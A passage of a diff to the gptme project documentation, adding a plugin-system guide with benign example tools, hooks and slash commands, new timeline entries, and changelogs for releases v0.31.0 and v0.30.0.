-- Message processing: `gptme/chat.py` (MESSAGE_* hooks don't work in server)
-- Server logic: `gptme/server/api_v2_sessions.py` (needs hook integration)
+   from gptme.tools.base import ToolSpec
+
+   def hello_world():
+       """Say hello to the world."""
+       print("Hello from my plugin!")
+       return "Hello, World!"
+
+   # Tool specification that gptme will discover
+   hello_tool = ToolSpec(
+       name="hello",
+       desc="Say hello",
+       instructions="Use this tool to greet the world.",
+       functions=[hello_world],
+   )
+
+3. Use Your Plugin
+^^^^^^^^^^^^^^^^^^
+
+Start gptme and your plugin tools will be automatically discovered and available:
+
+.. code-block:: bash
+
+   $ gptme "use the hello tool"
+   > Using tool: hello
+   Hello from my plugin!
+
+How It Works
+------------
+
+1. **Discovery**: gptme searches configured plugin paths for directories with ``__init__.py``
+2. **Loading**: For each plugin, gptme discovers:
+
+   - Tool modules in ``tools/`` subdirectory
+   - Hook modules in ``hooks/`` subdirectory
+   - Command modules in ``commands/`` subdirectory
+
+3. **Integration**:
+
+   - Plugin tools are loaded using the same mechanism as built-in tools
+   - Plugin hooks are registered during initialization via their ``register()`` functions
+   - Plugin commands are registered during initialization via their ``register()`` functions
+
+4. **Availability**:
+
+   - Tools appear in ``--tools`` list and can be used like built-in tools
+   - Hooks are automatically triggered at appropriate lifecycle points
+   - Commands can be invoked with ``/`` prefix like built-in commands
+
+Plugin Tool Modules
+-------------------
+
+Plugins can provide tools in two ways:
+
+Option 1: tools/ as a Package
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Create ``tools/__init__.py`` and gptme will import ``my_plugin.tools`` as a package:
+
+.. code-block:: python
+
+   # my_plugin/tools/__init__.py
+   from gptme.tools.base import ToolSpec
+
+   tool1 = ToolSpec(...)
+   tool2 = ToolSpec(...)
+
+Option 2: Individual Tool Files
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Skip ``tools/__init__.py`` and create individual files:
+
+.. code-block:: text
+
+   my_plugin/tools/
+   ├── tool1.py
+   └── tool2.py
+
+Each file will be imported as ``my_plugin.tools.tool1``, ``my_plugin.tools.tool2``, etc.
+
+Plugin Hook Modules
+-------------------
+
+Plugins can provide hooks to extend gptme's behavior at various lifecycle points, similar to how tools work.
+
+Option 1: hooks/ as a Package
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Create ``hooks/__init__.py`` and define a ``register()`` function:
+
+.. code-block:: python
+
+   # my_plugin/hooks/__init__.py
+   from gptme.hooks import HookType, register_hook
+   from gptme.message import Message
+
+   def my_session_hook(logdir, workspace, initial_msgs):
+       """Hook called at session start."""
+       yield Message("system", f"Plugin initialized in workspace: {workspace}")
+
+   def register():
+       """Register all hooks from this module."""
+       register_hook(
+           "my_plugin.session_start",
+           HookType.SESSION_START,
+           my_session_hook,
+           priority=0
+       )
+
+Option 2: Individual Hook Files
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Create individual hook modules without ``hooks/__init__.py``:
+
+.. code-block:: python
+
+   # my_plugin/hooks/logging_hook.py
+   from gptme.hooks import HookType, register_hook
+   from gptme.message import Message
+
+   def log_tool_execution(log, workspace, tool_use):
+       """Log tool executions."""
+       print(f"Executing tool: {tool_use.tool}")
+       yield  # Hooks must be generators
+
+   def register():
+       """Register hooks from this module."""
+       register_hook(
+           "my_plugin.log_tool",
+           HookType.TOOL_PRE_EXECUTE,
+           log_tool_execution,
+           priority=0
+       )
+
+Hook Types
+^^^^^^^^^^
+
+Available hook types:
+
+- ``SESSION_START`` - Called at session start
+- ``SESSION_END`` - Called at session end
+- ``TOOL_PRE_EXECUTE`` - Before tool execution
+- ``TOOL_POST_EXECUTE`` - After tool execution
+- ``FILE_PRE_SAVE`` - Before saving a file
+- ``FILE_POST_SAVE`` - After saving a file
+- ``GENERATION_PRE`` - Before generating response
+- ``GENERATION_POST`` - After generating response
+- And more (see ``gptme.hooks.HookType``)
+
+Hook Registration
+^^^^^^^^^^^^^^^^^
+
+Every hook module must have a ``register()`` function that calls ``register_hook()`` for each hook it provides. The plugin system automatically calls ``register()`` during initialization.
+
+.. _plugin-command-modules:
+
+Plugin Command Modules
+----------------------
+
+Plugins can provide custom commands that users can invoke with the ``/`` prefix, similar to built-in commands like ``/help`` or ``/exit``.
+
+Option 1: commands/ as a Package
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Create ``commands/__init__.py`` and define a ``register()`` function:
+
+.. code-block:: python
+
+   # my_plugin/commands/__init__.py
+   from gptme.commands import register_command, CommandContext
+   from gptme.message import Message
+
+   def weather_handler(ctx: CommandContext):
+       """Handle the /weather command."""
+       location = ctx.full_args or "Stockholm"
+       # Your weather logic here
+       yield Message("system", f"Weather in {location}: Sunny, 20°C")
+
+   def register():
+       """Register all commands from this module."""
+       register_command("weather", weather_handler, aliases=["w"])
+
+Option 2: Individual Command Files
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Create individual command modules without ``commands/__init__.py``:
+
+.. code-block:: python
+
+   # my_plugin/commands/joke.py
+   from gptme.commands import register_command, CommandContext
+   from gptme.message import Message
+
+   def joke_handler(ctx: CommandContext):
+       """Tell a random joke."""
+       jokes = [
+           "Why did the AI cross the road? To optimize the other side!",
+           "What's an AI's favorite snack? Microchips!",
+       ]
+       import random
+       yield Message("system", random.choice(jokes))
+
+   def register():
+       """Register command."""
+       register_command("joke", joke_handler, aliases=["j"])
+
+Using Plugin Commands
+^^^^^^^^^^^^^^^^^^^^^
+
+Once registered, commands can be used like built-in commands:
+
+.. code-block:: bash
+
+   $ gptme
+   > /weather London
+   Weather in London: Sunny, 20°C
+
+   > /joke
+   Why did the AI cross the road? To optimize the other side!
+
+Command Handler Requirements
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Command handlers must:
+
+1. Accept a ``CommandContext`` parameter with:
+
+   - ``args``: List of space-separated arguments
+   - ``full_args``: Complete argument string
+   - ``manager``: LogManager instance
+   - ``confirm``: Confirmation function
+
+2. Be a generator (use ``yield``) that yields ``Message`` objects
+3. Be registered via ``register_command()`` in a ``register()`` function
+
+Example: Logging Plugin
+-----------------------
+
+A complete example of a plugin that logs tool executions:
+
+.. code-block:: python
+
+   # my_logging_plugin/hooks/tool_logger.py
+   from gptme.hooks import HookType, register_hook
+   import logging
+
+   logger = logging.getLogger(__name__)
+
+   def log_tool_pre(log, workspace, tool_use):
+       """Log before tool execution."""
+       logger.info(f"Executing tool: {tool_use.tool} with args: {tool_use.args}")
+       yield  # Hooks must be generators
+
+   def log_tool_post(log, workspace, tool_use, result):
+       """Log after tool execution."""
+       logger.info(f"Tool {tool_use.tool} completed")
+       yield
+
+   def register():
+       register_hook("tool_logger.pre", HookType.TOOL_PRE_EXECUTE, log_tool_pre)
+       register_hook("tool_logger.post", HookType.TOOL_POST_EXECUTE, log_tool_post)
+
+Example: Weather Plugin
+-----------------------
+
+A complete example of a weather information plugin:
+
+**my_weather/tools/weather.py:**
+
+.. code-block:: python
+
+   from gptme.tools.base import ToolSpec, ToolUse
+   import requests
+
+   def get_weather(location: str) -> str:
+       """Get weather for a location."""
+       # Implementation
+       return f"Weather in {location}: Sunny, 72°F"
+
+   weather_tool = ToolSpec(
+       name="weather",
+       desc="Get current weather information",
+       instructions="Use this tool to get weather for a location.",
+       functions=[get_weather],
+   )
+
+**Configuration (~/.config/gptme/gptme.toml):**
+
+.. code-block:: toml
+
+   [plugins]
+   paths = ["~/.config/gptme/plugins"]
+
+**Usage:**
+
+.. code-block:: bash
+
+   $ gptme "what's the weather in San Francisco?"
+   > Using tool: weather
+   Weather in San Francisco: Sunny, 72°F
+
+Distribution
+------------
+
+Plugins can be distributed as:
+
+1. **Git repositories**: Clone into plugin directory
+
+   .. code-block:: bash
+
+      git clone https://github.com/user/gptme-plugin ~/.config/gptme/plugins/plugin-name
+
+2. **PyPI packages**: Install and add to plugin path
+
+   .. code-block:: bash
+
+      pip install gptme-weather-plugin
+      # Add site-packages location to plugins.paths in gptme.toml
+
+3. **Local directories**: Copy plugin folder to plugin path
+
+   .. code-block:: bash
+
+      cp -r my_plugin ~/.config/gptme/plugins/
+
+Migration from TOOL_MODULES
+----------------------------
+
+The plugin system is compatible with the existing ``TOOL_MODULES`` environment variable.
+
+**Old approach:**
+
+.. code-block:: bash
+
+   export TOOL_MODULES="gptme.tools,my_custom_tools"
+   gptme
+
+**New approach (gptme.toml):**
+
+.. code-block:: toml
+
+   [plugins]
+   paths = ["~/.config/gptme/plugins"]
+   enabled = ["my_plugin"]
+
+Both approaches work and can coexist. The plugin system provides better organization and discoverability for complex tool collections.
+
+Future: Hooks and Commands
+---------------------------
+
+Future phases will add support for:
+
+- **Hooks**: Plugin-provided hooks for events (e.g., pre-generation, post-execution)
+- **Commands**: Plugin-provided commands for the gptme CLI
+
+Stay tuned for updates!
+
+Troubleshooting
+---------------
+
+**Plugin not discovered:**
+
+- Ensure plugin directory has ``__init__.py``
+- Check plugin path is correctly configured in ``gptme.toml``
+- Verify path is absolute or relative to config directory
+
+**Tools not loading:**
+
+- Check ``tools/`` directory exists and has proper structure
+- Verify tool modules define ``ToolSpec`` instances
+- Look for import errors in gptme logs
+
+**Plugin not enabled:**
+
+- If using ``plugins.enabled`` allowlist, ensure plugin name is included
+- Remove ``enabled`` list to load all discovered plugins
 
 
 API Reference
@@ -4005,8 +6250,70 @@ The idea is to later make this into a timeline similar to the one for `ActivityW
 
     This file can be automatically updated by gptme with the help of `gh release list` and `gh release view` commands.
 
+Unreleased
+----------
+
+- MCP prompts and resources support
+- Anthropic native web search
+- PDF support in browser tool (using pypdf)
+- Skills summary in system prompt
+- Lesson keyword wildcard and regex pattern support
+- Session cost summary on exit
+- Master Context Architecture for autocompact
+
+2026
+----
+
+January
+
+- gptme-agent-template v0.4 release (2026-01-23)
+
+  - Autonomous agent run loops
+  - Enhanced context generation
+  - Bob reaches 1000+ autonomous sessions milestone
+
 2025
 ----
+
+December
+
+- v0.31.0 (2025-12-15)
+
+  - Background jobs for long-running shell commands
+  - Form tool for structured user input
+  - Cost tracking and token awareness hooks
+  - Content-addressable file storage
+  - Lessons caching and plugin auto-discovery
+  - Cursor .mdc rules support
+
+November
+
+- v0.30.0 (2025-11-18)
+
+  - Plugin system (tools, hooks, commands from plugins)
+  - Context selector infrastructure
+  - Subagent planner mode
+  - Improved support for custom OpenAI-compatible providers
+
+October
+
+- v0.29.0 (2025-10-21)
+
+  - Lessons system for contextual guidance (auto-included based on keywords/tools)
+  - MCP discovery and dynamic loading
+  - Token and time awareness hooks
+  - Shellcheck validation for shell commands
+  - Bob begins autonomous runs with GitHub monitoring
+
+August
+
+- v0.28.0 (2025-08-13)
+
+  - MCP (Model Context Protocol) support
+  - Morph tool for fast AI-powered edits
+  - Auto-commit feature
+  - Redesigned server API (v2)
+  - ChatConfig for per-conversation settings
 
 March
 
@@ -4057,6 +6364,7 @@ November
 - v0.24.0 (2024-11-22)
 - gptme-rag v0.3.0 release (2024-11-22)
 - gptme-agent-template initial release v0.1 (2024-11-21)
+- `Bob <https://github.com/TimeToBuildBob>`_ created (2024-11-14) - first autonomous agent built on gptme
 - gptme-rag initial release v0.1.0 (2024-11-15)
 - v0.23.0 (2024-11-14)
 - gptme-webui initial release (2024-11-03)
@@ -4170,6 +6478,8 @@ The changelog is also available in the repository releases <https://github.com/g
 .. toctree::
    :maxdepth: 1
 
+   releases/v0.31.0.md
+   releases/v0.30.0.md
    releases/v0.29.0.md
    releases/v0.28.3.md
    releases/v0.28.2.md
@@ -4220,6 +6530,253 @@ The changelog is also available in the repository releases <https://github.com/g
    releases/v0.2.2.md
    releases/v0.2.1.md
    releases/v0.1.1.md
+
+
+# v0.31.0
+
+These are the release notes for gptme version v0.31.0.
+
+## Contributors
+
+Thanks to everyone who contributed to this release:
+
+@erikbjare, @nikongo, @TimeToBuildBob
+
+## Changelog
+
+Changes since v0.30.0:
+
+
+## 📦 gptme
+
+### ✨ Features (25)
+
+ - feat(lessons): auto-discover lessons from plugins ([#944](https://github.com/gptme/gptme/issues/944)) ([`ab531ad20`](https://github.com/gptme/gptme/commit/ab531ad20))
+ - feat(message): add MessageMetadata TypedDict for token/cost tracking ([#943](https://github.com/gptme/gptme/issues/943)) ([`684bbb6ff`](https://github.com/gptme/gptme/commit/684bbb6ff))
+ - feat(cost): implement cost_awareness hook for session cost tracking ([#939](https://github.com/gptme/gptme/issues/939)) ([`ed409cb26`](https://github.com/gptme/gptme/commit/ed409cb26))
+ - feat(telemetry): improve trace quality with context propagation and rich metrics ([#942](https://github.com/gptme/gptme/issues/942)) ([`5be5a39d4`](https://github.com/gptme/gptme/commit/5be5a39d4))
+ - feat(shell): add background job support for long-running commands ([#902](https://github.com/gptme/gptme/issues/902)) ([`c48bf9bd7`](https://github.com/gptme/gptme/commit/c48bf9bd7))
+ - feat(setup): validate API keys before saving (Issue [#930](https://github.com/gptme/gptme/issues/930)) ([#931](https://github.com/gptme/gptme/issues/931)) ([`bf1bc716b`](https://github.com/gptme/gptme/commit/bf1bc716b))
+ - feat(lessons): add caching and deduplication to lesson index ([#928](https://github.com/gptme/gptme/issues/928)) ([`3fdbf4186`](https://github.com/gptme/gptme/commit/3fdbf4186))
+ - feat(hooks): add form auto-detection hook (Issue [#591](https://github.com/gptme/gptme/issues/591)) ([#919](https://github.com/gptme/gptme/issues/919)) ([`40dc68f45`](https://github.com/gptme/gptme/commit/40dc68f45))
+ - feat(logmanager): add content-addressable file storage (Issue [#150](https://github.com/gptme/gptme/issues/150)) ([#913](https://github.com/gptme/gptme/issues/913)) ([`86febf7de`](https://github.com/gptme/gptme/commit/86febf7de))
+ - feat(tools): add form tool for structured user input (Issue [#591](https://github.com/gptme/gptme/issues/591)) ([#911](https://github.com/gptme/gptme/issues/911)) ([`92c475a47`](https://github.com/gptme/gptme/commit/92c475a47))
+ - feat: add Docker container for GitHub bot (Issue [#305](https://github.com/gptme/gptme/issues/305)) ([#905](https://github.com/gptme/gptme/issues/905)) ([`ec1204fa9`](https://github.com/gptme/gptme/commit/ec1204fa9))
+ - feat(tmux): add wait command to monitor long-running commands ([#901](https://github.com/gptme/gptme/issues/901)) ([`0ee75e544`](https://github.com/gptme/gptme/commit/0ee75e544))
+ - feat(prompt): add multi-line input support ([#899](https://github.com/gptme/gptme/issues/899)) ([`558ee3b5f`](https://github.com/gptme/gptme/commit/558ee3b5f))
+ - feat(autocompact): add Phase 3 extractive compression for long messages ([#886](https://github.com/gptme/gptme/issues/886)) ([`cca057c63`](https://github.com/gptme/gptme/commit/cca057c63))
+ - feat: add diagnostic logging to shell tool for Issue [#408](https://github.com/gptme/gptme/issues/408) ([#890](https://github.com/gptme/gptme/issues/890)) ([`750009193`](https://github.com/gptme/gptme/commit/750009193))
+ - feat: support GPTME_TTS_SPEED and set exclude-newer for tts_server.py script to fix issues ([`eed3a987c`](https://github.com/gptme/gptme/commit/eed3a987c))
+ - feat(llm): add constrained decoding support ([#776](https://github.com/gptme/gptme/issues/776)) ([`94621288d`](https://github.com/gptme/gptme/commit/94621288d))
+ - feat: add Cursor .mdc rules support (Issue [#686](https://github.com/gptme/gptme/issues/686) Phase 5) ([#882](https://github.com/gptme/gptme/issues/882)) ([`59723c493`](https://github.com/gptme/gptme/commit/59723c493))
+ - feat: Enhanced plugin management with smart src/ layout discovery ([#873](https://github.com/gptme/gptme/issues/873)) ([`0ccdfbe44`](https://github.com/gptme/gptme/commit/0ccdfbe44))
+ - feat: add compression analysis utilities and script ([#864](https://github.com/gptme/gptme/issues/864)) ([`fd3d8edc2`](https://github.com/gptme/gptme/commit/fd3d8edc2))
+ - feat(eval): GEPA Week 3 - HybridOptimizer with adaptive multi-stage optimization ([#859](https://github.com/gptme/gptme/issues/859)) ([`58cce70f8`](https://github.com/gptme/gptme/commit/58cce70f8))
+ - feat(context): implement hooks-based context compression architecture ([#844](https://github.com/gptme/gptme/issues/844)) ([`20435f324`](https://github.com/gptme/gptme/commit/20435f324))
+ - feat(context): implement Phase 3.1.1 core infrastructure ([#860](https://github.com/gptme/gptme/issues/860)) ([`b898c8550`](https://github.com/gptme/gptme/commit/b898c8550))
+ - feat: implement active context discovery ([#856](https://github.com/gptme/gptme/issues/856)) ([`990fdca36`](https://github.com/gptme/gptme/commit/990fdca36))
+ - feat: add restart tool ([#853](https://github.com/gptme/gptme/issues/853)) ([`418532ea8`](https://github.com/gptme/gptme/commit/418532ea8))
+
+### 🐛 Fixes (50)
+<details><summary>Click to expand</summary>
+<p>
+
+ - fix(config): remove quiet parameter from cache key to prevent duplicate entries ([`61b81b0f5`](https://github.com/gptme/gptme/commit/61b81b0f5))
+ - fix: mark plugins as loaded even if no tool_modules ([`8917b180f`](https://github.com/gptme/gptme/commit/8917b180f))
+ - fix: more fixes to invalid unicode handling in shell tool ([`65151ee60`](https://github.com/gptme/gptme/commit/65151ee60))
+ - fix: improved style of initial output ([`06730c6bb`](https://github.com/gptme/gptme/commit/06730c6bb))
+ - fix: fix invalid unicode handling in shell tool ([`d3b7ddd87`](https://github.com/gptme/gptme/commit/d3b7ddd87))
+ - fix: hide token/time/cost awareness messages by default ([`755070737`](https://github.com/gptme/gptme/commit/755070737))
+ - fix: suppress duplicate config log when loading conversation metadata ([`10148567b`](https://github.com/gptme/gptme/commit/10148567b))
+ - fix: reduce plugin logging spam by logging each plugin once when loaded ([`8e50bcde7`](https://github.com/gptme/gptme/commit/8e50bcde7))
+ - fix: handle interrupt detection when hooks add messages after interrupt ([`216f274da`](https://github.com/gptme/gptme/commit/216f274da))
+ - fix(autocompact): add minimum savings threshold to avoid wasteful compaction ([#946](https://github.com/gptme/gptme/issues/946)) ([`2f5b7825c`](https://github.com/gptme/gptme/commit/2f5b7825c))
+ - fix: suppress telemetry token warnings ([`2aa146e46`](https://github.com/gptme/gptme/commit/2aa146e46))
+ - fix: fixed metadata for xai models ([`d9c42f2ba`](https://github.com/gptme/gptme/commit/d9c42f2ba))
+ - fix: improved agent setup instructions with more extensive extra/optional/recommended packages ([`4f5b64dab`](https://github.com/gptme/gptme/commit/4f5b64dab))
+ - fix: handle unquoted glob patterns in Cursor .mdc files ([`b09f74dca`](https://github.com/gptme/gptme/commit/b09f74dca))
+ - fix(telemetry): remove noisy codeblock tracing (Issue [#199](https://github.com/gptme/gptme/issues/199)) ([#936](https://github.com/gptme/gptme/issues/936)) ([`c36e25089`](https://github.com/gptme/gptme/commit/c36e25089))
+ - fix: capture both stdout and stderr from context_cmd on error ([#933](https://github.com/gptme/gptme/issues/933)) ([`4e81c9187`](https://github.com/gptme/gptme/commit/4e81c9187))
+ - fix: attribute perplexity use to gptme on openrouter ([#929](https://github.com/gptme/gptme/issues/929)) ([`50792e65f`](https://github.com/gptme/gptme/commit/50792e65f))
+ - fix: fix prompt_systeminfo to work on android/termux ([`e5fa38fd8`](https://github.com/gptme/gptme/commit/e5fa38fd8))
+ - fix(tests): clean up gptme_N sessions in tmux test fixture ([#926](https://github.com/gptme/gptme/issues/926)) ([`dbe1676e4`](https://github.com/gptme/gptme/commit/dbe1676e4))
+ - fix: read [prompt] section in project config ([#927](https://github.com/gptme/gptme/issues/927)) ([`1ee053ad1`](https://github.com/gptme/gptme/commit/1ee053ad1))
+ - fix(telemetry): filter NotGiven attribute warnings from OTEL instrumentation ([#925](https://github.com/gptme/gptme/issues/925)) ([`a50b70623`](https://github.com/gptme/gptme/commit/a50b70623))
+ - fix(tmux): truncate long pane output to prevent context overflow (Issue [#923](https://github.com/gptme/gptme/issues/923)) ([#924](https://github.com/gptme/gptme/issues/924)) ([`7590830b8`](https://github.com/gptme/gptme/commit/7590830b8))
+ - fix(llm): add empty reasoning_content field for DeepSeek assistant messages with tool_calls ([#918](https://github.com/gptme/gptme/issues/918)) ([`20f4888cf`](https://github.com/gptme/gptme/commit/20f4888cf))
+ - fix(tests): add cleanup fixtures for ShellSession and subagents (Issue [#910](https://github.com/gptme/gptme/issues/910)) ([#912](https://github.com/gptme/gptme/issues/912)) ([`980917817`](https://github.com/gptme/gptme/commit/980917817))
+ - fix(mcp): preserve server process when conversation is interrupted ([#914](https://github.com/gptme/gptme/issues/914)) ([`c4b59c240`](https://github.com/gptme/gptme/commit/c4b59c240))
+ - fix(browser): improve error messages for search bot detection ([#904](https://github.com/gptme/gptme/issues/904)) ([`ba3c0233f`](https://github.com/gptme/gptme/commit/ba3c0233f))
+ - fix(config): remove assertions requiring prompt/env in user config ([#909](https://github.com/gptme/gptme/issues/909)) ([`06a451433`](https://github.com/gptme/gptme/commit/06a451433))
+ - fix(codeblock): handle nested codeblocks with same language tag ([#903](https://github.com/gptme/gptme/issues/903)) ([`79fdd6ea9`](https://github.com/gptme/gptme/commit/79fdd6ea9))
+ - fix(shell): prevent output mixing between commands (Issue [#408](https://github.com/gptme/gptme/issues/408)) ([#906](https://github.com/gptme/gptme/issues/906)) ([`25dac14f2`](https://github.com/gptme/gptme/commit/25dac14f2))
+ - fix(llm): handle mixed content types in Groq/DeepSeek transformation ([#896](https://github.com/gptme/gptme/issues/896)) ([`31ef55c01`](https://github.com/gptme/gptme/commit/31ef55c01))
+ - fix(message): resolve file paths to absolute when serializing ([#898](https://github.com/gptme/gptme/issues/898)) ([`4a62f837d`](https://github.com/gptme/gptme/commit/4a62f837d))
+ - fix(message): escape Rich markup in non-code-block content ([#894](https://github.com/gptme/gptme/issues/894)) ([`369c72c32`](https://github.com/gptme/gptme/commit/369c72c32))
+ - fix(lessons): lazy-load ACE to prevent import warnings ([#893](https://github.com/gptme/gptme/issues/893)) ([`5e5557d05`](https://github.com/gptme/gptme/commit/5e5557d05))
+ - fix: support custom providers in model selection and routing ([#891](https://github.com/gptme/gptme/issues/891)) ([`f20bdc18a`](https://github.com/gptme/gptme/commit/f20bdc18a))
+ - fix: add browser recovery logic to prevent deadlocks on connection errors ([#888](https://github.com/gptme/gptme/issues/888)) ([`ede5080f2`](https://github.com/gptme/gptme/commit/ede5080f2))
+ - fix: prevent file content inclusion in command arguments ([#889](https://github.com/gptme/gptme/issues/889)) ([`a665571df`](https://github.com/gptme/gptme/commit/a665571df))
+ - fix: prettier errors on fatal exceptions ([`d9f2c06e2`](https://github.com/gptme/gptme/commit/d9f2c06e2))
+ - fix: fix toolcall format to allow dots in call_id (fixes Kimi K2) ([`6e970e546`](https://github.com/gptme/gptme/commit/6e970e546))
+ - fix: add better cost telemetry logging in optimizable scenarios ([#883](https://github.com/gptme/gptme/issues/883)) ([`7092eae59`](https://github.com/gptme/gptme/commit/7092eae59))
+ - fix: added claude-opus-4-5 ([`4a9363a4b`](https://github.com/gptme/gptme/commit/4a9363a4b))
+ - fix(tests): explicitly disable chat history in server v2 test ([#872](https://github.com/gptme/gptme/issues/872)) ([`b888abbea`](https://github.com/gptme/gptme/commit/b888abbea))
+ - fix(shell): added SC1011 and SC1073 to shellcheck error codes ([`4acc3748e`](https://github.com/gptme/gptme/commit/4acc3748e))
+ - fix: skip large files in active_context hook ([`ecc1da20d`](https://github.com/gptme/gptme/commit/ecc1da20d))
+ - fix: detect git version from pip's direct_url.json for pipx installs ([#871](https://github.com/gptme/gptme/issues/871)) ([`f557c43b8`](https://github.com/gptme/gptme/commit/f557c43b8))
+ - fix(patch): implement relaxed whitespace matching for whitespace-only lines ([#861](https://github.com/gptme/gptme/issues/861)) ([`6681751aa`](https://github.com/gptme/gptme/commit/6681751aa))
+ - fix(server): add default model fallback and improve error messages ([#863](https://github.com/gptme/gptme/issues/863)) ([`ebdd3df98`](https://github.com/gptme/gptme/commit/ebdd3df98))
+ - fix(shell): properly terminate child processes on timeout ([#868](https://github.com/gptme/gptme/issues/868)) ([`00377049a`](https://github.com/gptme/gptme/commit/00377049a))
+ - fix(dspy): register metadata for complexity test tasks ([#867](https://github.com/gptme/gptme/issues/867)) ([`767264944`](https://github.com/gptme/gptme/commit/767264944))
+ - fix(tools): preserve full type information in tool signatures ([#865](https://github.com/gptme/gptme/issues/865)) ([`10ddeb6cb`](https://github.com/gptme/gptme/commit/10ddeb6cb))
+ - fix: initialize tools and model in subagent threads ([#854](https://github.com/gptme/gptme/issues/854)) ([`389549c7f`](https://github.com/gptme/gptme/commit/389549c7f))
+
+</p>
+</details>
+
+### 🔨 Misc (22)
+<details><summary>Click to expand</summary>
+<p>
+
+ - chore: bump version to 0.31.0 ([`a211c2a1f`](https://github.com/gptme/gptme/commit/a211c2a1f))
+ - docs: add TODO comment to prompts.py about optimizing prompt caching of context_cmd ([`63c998da5`](https://github.com/gptme/gptme/commit/63c998da5))
+ - style: use consistent 'Using' prefix for local config log message ([`4fbcf8927`](https://github.com/gptme/gptme/commit/4fbcf8927))
+ - docs(bot): improve GitHub bot documentation ([#938](https://github.com/gptme/gptme/issues/938)) ([`bc3929e4e`](https://github.com/gptme/gptme/commit/bc3929e4e))
+ - chore: small fixes and formatting ([#934](https://github.com/gptme/gptme/issues/934)) ([`0e7edef0d`](https://github.com/gptme/gptme/commit/0e7edef0d))
+ - docs: updated agent setup guide ([`8d1b0b88d`](https://github.com/gptme/gptme/commit/8d1b0b88d))
+ - chore(config): disable fresh context mode ([`f71558992`](https://github.com/gptme/gptme/commit/f71558992))
+ - docs: add issue labeling guide to contributing docs (Issue [#874](https://github.com/gptme/gptme/issues/874)) ([#922](https://github.com/gptme/gptme/issues/922)) ([`606e7ead8`](https://github.com/gptme/gptme/commit/606e7ead8))
+ - refactor(bot): simplify action.yml to use github_bot.py script (Issue [#305](https://github.com/gptme/gptme/issues/305)) ([#915](https://github.com/gptme/gptme/issues/915)) ([`1e3c020d9`](https://github.com/gptme/gptme/commit/1e3c020d9))
+ - docs: add optional system dependencies section ([#897](https://github.com/gptme/gptme/issues/897)) ([`2718cb369`](https://github.com/gptme/gptme/commit/2718cb369))
+ - Fix: Use conservative token limit for Anthropic models to prevent overflow ([#887](https://github.com/gptme/gptme/issues/887)) ([`f94ecc3cb`](https://github.com/gptme/gptme/commit/f94ecc3cb))
+ - docs: added more model alternatives and notes on model and provider selection ([`c7b5fd8f7`](https://github.com/gptme/gptme/commit/c7b5fd8f7))
+ - docs: Phase 4 - Add plugin example links and decision guidance ([#881](https://github.com/gptme/gptme/issues/881)) ([`746fe1d04`](https://github.com/gptme/gptme/commit/746fe1d04))
+ - docs: clarify skills vs plugins architecture ([#880](https://github.com/gptme/gptme/issues/880)) ([`66168d633`](https://github.com/gptme/gptme/commit/66168d633))
+ - refactor: Adopt Anthropic skill format (replaces [#876](https://github.com/gptme/gptme/issues/876)) ([#877](https://github.com/gptme/gptme/issues/877)) ([`8d8faca55`](https://github.com/gptme/gptme/commit/8d8faca55))
+ - test: mark flaky test as flaky ([`6b91b0d5f`](https://github.com/gptme/gptme/commit/6b91b0d5f))
+ - test(dspy): add comprehensive unit tests for GptmeReasoningProgram ([#870](https://github.com/gptme/gptme/issues/870)) ([`8a8c04e8e`](https://github.com/gptme/gptme/commit/8a8c04e8e))
+ - docs(dspy): add comprehensive documentation for use_reasoning_program parameter ([#869](https://github.com/gptme/gptme/issues/869)) ([`f81301090`](https://github.com/gptme/gptme/commit/f81301090))
+ - tests: add xfail to flaky test ([`8f609310f`](https://github.com/gptme/gptme/commit/8f609310f))
+ - docs: more docs fixes ([#852](https://github.com/gptme/gptme/issues/852)) ([`15550cb1d`](https://github.com/gptme/gptme/commit/15550cb1d))
+ - docs: custom provider docs fix ([#851](https://github.com/gptme/gptme/issues/851)) ([`b57b22b68`](https://github.com/gptme/gptme/commit/b57b22b68))
+ - docs: fixes to docs, clean up ([#850](https://github.com/gptme/gptme/issues/850)) ([`0464aad99`](https://github.com/gptme/gptme/commit/0464aad99))
+
+</p>
+</details>
+
+*(excluded 4 less relevant [commits](https://github.com/gptme/gptme/compare/v0.30.0...v0.31.0))*
+
+**Full Changelog**: https://github.com/gptme/gptme/compare/v0.30.0...v0.31.0
+
+
+# v0.30.0
+
+These are the release notes for gptme version v0.30.0.
+
+## Contributors
+
+Thanks to everyone who contributed to this release:
+
+@0xbrayo, @erikbjare, @TimeToBuildBob
+
+## Changelog
+
+Changes since v0.29.0:
+
+
+## 📦 gptme
+
+### ✨ Features (26)
+
+ - feat(context): Phase 1 - Core Context Selector Infrastructure ([#831](https://github.com/gptme/gptme/issues/831)) ([`71416f6c`](https://github.com/gptme/gptme/commit/71416f6c))
+ - feat: convert default model and hook registry to ContextVar for thread safety ([#848](https://github.com/gptme/gptme/issues/848)) ([`5a1ac7b9`](https://github.com/gptme/gptme/commit/5a1ac7b9))
+ - feat(plugins): implement Phase 3 command integration ([#846](https://github.com/gptme/gptme/issues/846)) ([`c7304c43`](https://github.com/gptme/gptme/commit/c7304c43))
+ - feat(plugins): implement Phase 2 hook integration ([#845](https://github.com/gptme/gptme/issues/845)) ([`e86fe8e0`](https://github.com/gptme/gptme/commit/e86fe8e0))
+ - feat(plugins): implement Phase 1 plugin infrastructure ([#843](https://github.com/gptme/gptme/issues/843)) ([`fe8b355c`](https://github.com/gptme/gptme/commit/fe8b355c))
+ - feat(server): add API v2 client for programmatic interaction ([#841](https://github.com/gptme/gptme/issues/841)) ([`dfd9f74f`](https://github.com/gptme/gptme/commit/dfd9f74f))
+ - feat: auto-enable complete tool in non-interactive mode and support multiple -t flags ([#836](https://github.com/gptme/gptme/issues/836)) ([`a5ccb6cd`](https://github.com/gptme/gptme/commit/a5ccb6cd))
+ - feat(gepa): Phase 2 test set expansion - 7 more tasks ([#833](https://github.com/gptme/gptme/issues/833)) ([`7bbce067`](https://github.com/gptme/gptme/commit/7bbce067))
+ - feat(gepa): implement Phase 1 test set expansion (12 new tasks) ([#832](https://github.com/gptme/gptme/issues/832)) ([`68bd60cf`](https://github.com/gptme/gptme/commit/68bd60cf))
